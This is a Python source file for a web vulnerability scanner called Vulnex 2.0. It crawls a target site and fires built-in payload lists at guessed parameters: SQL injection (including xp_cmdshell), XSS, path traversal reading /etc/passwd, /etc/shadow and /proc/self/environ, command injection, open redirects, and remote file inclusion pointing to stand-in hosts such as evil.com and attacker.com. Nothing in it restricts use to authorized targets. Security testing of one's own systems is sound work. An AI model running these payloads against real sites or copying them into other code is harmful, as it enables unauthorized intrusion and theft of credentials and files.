#!/usr/bin/env python3
import requests
import argparse
import sys
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading
from queue import Queue
import warnings

from banner import show_banner

warnings.filterwarnings("ignore")  # ignore SSL warnings

# -------------------------
# Payload libraries (10+ each)
# -------------------------
SQLI_PAYLOADS = [
    "' OR '1'='1 --", "' OR 'a'='a", "admin'--", "1 OR 1=1",
    "1' AND '1'='1", "' UNION SELECT NULL,NULL--", "' UNION SELECT username,password FROM users--",
    "' AND SLEEP(5)--", "'; EXEC xp_cmdshell('dir');--", "' OR 1=1#", "\" OR \"1\"=\"1", "1' OR '1'='1' /*"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(2)>", "<svg/onload=alert(3)>",
    "<body onload=alert(4)>", "<iframe src=javascript:alert(5)>", "<math href=xlink:href=javascript:alert(6)>",
    "'\"><script>alert(7)</script>", "<input onfocus=alert(8) autofocus>", "<video><source onerror=alert(9)>",
    "<details open ontoggle=alert(10)>", "<marquee onstart=alert(11)>"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../../../etc/shadow", "../../../../../../windows/win.ini",
    "../../../../../../boot.ini", "/etc/passwd%00", "../../../../../../etc/hosts",
    "../../../../../../proc/self/environ", "../../../../../../var/log/auth.log",
    "../../../../../../var/log/apache2/access.log", "../../../../../../usr/local/apache2/conf/httpd.conf",
    "../../../../../../etc/mysql/my.cnf"
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt", "http://attacker.com/backdoor.php",
    "https://raw.githubusercontent.com/evil/malicious.txt", "ftp://evil.com/malware.txt",
    "http://127.0.0.1/etc/passwd", "http://169.254.169.254/latest/meta-data/",
    "http://example.com/evil.js", "http://testphp.vulnweb.com/hack.txt",
    "http://evil.org/include.txt", "http://my.evilserver.com/shell.txt"
]

CMDI_PAYLOADS = [
    ";id", "| whoami", "&& uname -a", "; ls -la", "| cat /etc/passwd",
    "&& ping -c 1 127.0.0.1", "|| dir", "&& net user", "&& ps aux", "; sleep 5", "&& echo vulnerable"
]

REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "/\\evil.com", "https:evil.com", "////evil.com/%2e%2e",
    "/redirect?url=https://evil.com", "///attacker.com", "https://google.com%2f%2fevil.com",
    "https://%2Fevil.com", "https://subdomain.evil.com", "http://127.0.0.1:8080"
]

DIRECTORIES = [
    "/admin/", "/uploads/", "/backup/", "/.git/", "/config/", "/images/",
    "/css/", "/js/", "/test/", "/tmp/", "/logs/", "/private/", "/data/", "/files/"
]

HEADERS = {"User-Agent": "Vulnex/2.0"}

visited_links = set()
vuln_results = []
vuln_lock = threading.Lock()  # protect vuln_results writes

# -------------------------
# Utility functions
# -------------------------
def verbose_print(verbose, msg):
    if verbose:
        print(msg)

def crawl(url, depth=2, verbose=False):
    """Deep crawl the site to extract links"""
    links = []
    try:
        r = requests.get(url, headers=HEADERS, timeout=5, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            link = urljoin(url, a["href"])
            if urlparse(link).netloc == urlparse(url).netloc and link not in visited_links:
                visited_links.add(link)
                links.append(link)
                verbose_print(verbose, f"[Crawl] Found: {link}")
                if depth > 0:
                    links.extend(crawl(link, depth - 1, verbose))
    except Exception:
        pass
    return list(set(links))


def test_payloads_threaded(url, payloads, test_name, verbose=False, max_threads=5):
    """Threaded payload testing using user-defined thread count"""
    q = Queue()

    def worker():
        while True:
            try:
                payload = q.get_nowait()
            except Exception:
                break
            try:
                # attach payload intelligently
                test_url = url + payload if "?" in url else url + "/" + payload
                r = requests.get(test_url, headers=HEADERS, timeout=5, verify=False)
                # simple heuristics for evidence
                evidence_markers = ["error", "syntax", "root:", "<script>alert", "sql", "stack trace"]
                if any(marker in r.text.lower() for marker in evidence_markers):
                    with vuln_lock:
                        vuln_results.append(f"- {test_name} - {test_url} (Payload: {payload})")
                    verbose_print(verbose, f"[+] {test_name} detected at {test_url}")
            except Exception:
                pass
            finally:
                q.task_done()

    for p in payloads:
        q.put(p)

    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=worker)
        t.daemon = True  # Ctrl+C safe
        t.start()
        threads.append(t)

    try:
        q.join()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user. Exiting...")
        sys.exit(0)

# -------------------------
# Main scanner
# -------------------------
def run_scanner(target, verbose=False, threads=5):
    # reset globals per run
    global visited_links, vuln_results
    visited_links = set()
    vuln_results = []

    print(f"[+] Starting Vulnex scan on: {target}\n")

    # Crawl site
    print("[*] Crawling site...")
    links = crawl(target, depth=2, verbose=verbose)
    print(f"[+] Found {len(links)} pages to test\n")

    if not links:
        links = [target]

    # Threaded Payload Tests
    print("[*] Testing SQL Injection payloads...")
    for link in links:
        test_payloads_threaded(link + "?id=", SQLI_PAYLOADS, "SQL Injection", verbose, threads)

    print("[*] Testing XSS payloads...")
    for link in links:
        test_payloads_threaded(link + "?q=", XSS_PAYLOADS, "XSS", verbose, threads)

    print("[*] Testing LFI payloads...")
    for link in links:
        test_payloads_threaded(link + "?file=", LFI_PAYLOADS, "LFI", verbose, threads)

    print("[*] Testing RFI payloads...")
    for link in links:
        test_payloads_threaded(link + "?include=", RFI_PAYLOADS, "RFI", verbose, threads)

    print("[*] Testing Command Injection payloads...")
    for link in links:
        test_payloads_threaded(link + "?cmd=", CMDI_PAYLOADS, "Command Injection", verbose, threads)

    print("[*] Testing Open Redirect payloads...")
    for link in links:
        test_payloads_threaded(link + "?redirect=", REDIRECT_PAYLOADS, "Open Redirect", verbose, threads)

    # Directories (simple check)
    print("[*] Checking common directories...")
    for d in DIRECTORIES:
        full_url = target.rstrip("/") + d
        try:
            r = requests.get(full_url, headers=HEADERS, timeout=5, verify=False)
            if r.status_code == 200:
                with vuln_lock:
                    vuln_results.append(f"- Directory Listing (Low Risk) - {full_url}")
                verbose_print(verbose, f"[+] Directory accessible: {full_url}")
        except Exception:
            pass

    # SSL check (best-effort)
    try:
        import ssl, socket
        hostname = urlparse(target).netloc.split(":")[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                if cert and 'notAfter' in cert:
                    with vuln_lock:
                        vuln_results.append(f"- [Info] SSL valid till {cert['notAfter']}")
    except Exception:
        pass

    # Save Report
    try:
        with open("report.txt", "w") as f:
            f.write("==== Vulnex Report ====\n")
            f.write(f"Target: {target}\n\n")
            if vuln_results:
                for v in vuln_results:
                    f.write(v + "\n")
            else:
                f.write("No vulnerabilities detected.\n")
            f.write("\nReport Generated by Vulnex\n")
    except Exception as e:
        print(f"[!] Failed to write report: {e}")

    print("\n================================================================================")
    print("[+] Scan Complete ✅")
    print("[+] Report saved to report.txt")


# -------------------------
# Entry point
# -------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Vulnex 2.0 - Advanced Vulnerability Scanner",
        epilog="Example: ./Vulnex.py -u https://example.com -v -t 10"
    )
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    parser.add_argument("-v", "--verbose", help="Enable verbose mode", action="store_true")
    parser.add_argument("-t", "--threads", help="Number of concurrent threads per attack (default=5)", type=int, default=5)
    parser.add_argument("--no-banner", help="Do not show startup banner", action="store_true")
    args = parser.parse_args()

    # show banner (unless suppressed)
    if not args.no_banner:
        try:
            show_banner()
        except Exception:
            pass

    try:
        run_scanner(args.url, verbose=args.verbose, threads=args.threads)
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user. Exiting...")
        sys.exit(0)
